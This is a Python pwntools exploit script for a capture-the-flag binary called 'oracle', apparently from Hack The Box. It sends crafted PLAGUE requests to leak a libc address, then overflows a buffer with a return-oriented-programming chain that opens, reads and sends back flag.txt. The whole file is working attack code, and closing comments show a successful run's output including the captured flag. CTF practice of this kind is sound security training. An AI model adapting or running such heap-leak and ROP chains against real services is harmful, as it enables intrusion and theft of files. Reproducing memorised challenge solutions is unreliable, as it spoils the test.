#!/usr/bin/env python3

from pwn import *

# use "-l 500" with splitmind
context.terminal = ["tmux", "splitw", "-h", "-l 500"]

exe = ELF("pwn_oracle/challenge/oracle_patched")
libc = ELF("pwn_oracle/challenge/libc-2.31.so")
ld = ELF("pwn_oracle/challenge/ld-2.31.so")
context.binary = exe

host = "94.237.53.104"
port = 59873

localhost = "localhost"
localport = 9001

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    io = connect(localhost, localport)
    return io

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# shortcut lambda
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

# functions
def VIEW(competitor: bytes = b"me"):
    HTTP_START_LINE = b"%s %s %s\r\n" % (b"VIEW", competitor, b"a")
    END_HEADERS = b"\r\n"
    
    payload = HTTP_START_LINE + HEADERS + END_HEADERS
    s(payload)
    
def PLAGUE(competitor, content_length: int, target: bytes, body: bytes = b"a"):
    HTTP_START_LINE = b"%s %s %s\r\n" % (b"PLAGUE", competitor, b"a")
    HEADERS  = b"%s: %s\r\n" % (b"Content-Length", str(content_length).encode())
    if target:
        HEADERS += b"%s: %s\r\n" % (b"Plague-Target", target)
    END_HEADERS = b"\r\n"
    BODY = body

    payload = HTTP_START_LINE + HEADERS + END_HEADERS + BODY
    s(payload)
# --- end functions ---

# --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---

# 1. leak libc
## create unsortedbin
io = start()
PLAGUE(b"nocompetitor", 0x8, b"target")
io.close()
pause()

io = start()
PLAGUE(b"a", 0x8, b"target", b"\xe0")
io.recvuntil(b"Attempted plague: ")
leaked_heap = u64(io.recv(8))
libc.address = leaked_heap - 0x1ecbe0
success(f"done 2. libc.address: {hex(libc.address)}")
io.close()
pause()  
# ----------------------------------

## load gadgets
roplib = ROP(libc)
poprax = roplib.find_gadget(['pop rax', 'ret'])[0]
poprdi = roplib.find_gadget(['pop rdi', 'ret'])[0]
poprsi = roplib.find_gadget(['pop rsi', 'ret'])[0]
poprdx_poprbx = roplib.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
poprbx = roplib.find_gadget(['pop rbx', 'ret'])[0]
syscall = roplib.find_gadget(['syscall', 'ret'])[0]
ret = roplib.ret[0]
mov_derbx_rax_poprbx_ret = libc.address + 0x1534e5 #: mov qword ptr [rbx], rax ; pop rbx ; ret
## --- done load gadgets ---

socket_fd = 6
file_fd = 7
file_name_loc = libc.bss() # string 'flag.txt'
file_content_read_loc = libc.bss() + 0x8 # 'flag.txt''s content

filename = b"flag.txt"

# write file name to file_name_loc

payload = flat(
    poprax,
    b"flag.txt",
    poprbx,
    file_name_loc,
    mov_derbx_rax_poprbx_ret,
    0,
)

# open('flag.txt', 0, 0)
payload += flat(
    poprax,
    2,
    poprdi,
    file_name_loc,
    poprsi,
    0,
    poprdx_poprbx,
    0,
    0,
    syscall,
)

# read(file_fd, file_content_read_loc, 0x20)

payload += flat(
    poprax,
    0,
    poprdi,
    file_fd,
    poprsi,
    file_content_read_loc,
    poprdx_poprbx,
    0x20,
    0,
    syscall,
)

# write(socket_fd, file_content_read_loc, 0x20)
payload += flat(
    poprax,
    1,
    poprdi,
    socket_fd,
    syscall,    
)

io = start()
PLAGUE(b"nocompetitor", 0x10, b"a"*0x405 + b"\x37" + payload)
io.interactive()


# [+] Opening connection to localhost on port 9001: Done
# [*] Closed connection to localhost port 9001
# [*] Paused (press any to continue)
# [+] Opening connection to localhost on port 9001: Done
# [+] done 2. libc.address: 0x7f2cbca09000
# [*] Closed connection to localhost port 9001
# [*] Paused (press any to continue)
# [*] Loaded 195 cached gadgets for 'pwn_oracle/challenge/libc-2.31.so'
# [+] Opening connection to localhost on port 9001: Done
# [*] Switching to interactive mode
# HTB{wH4t_d1D_tH3_oRAcL3_s4y_tO_tH3_f1gHt3r?}
# \x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
# $
# [*] Closed connection to localhost port 9001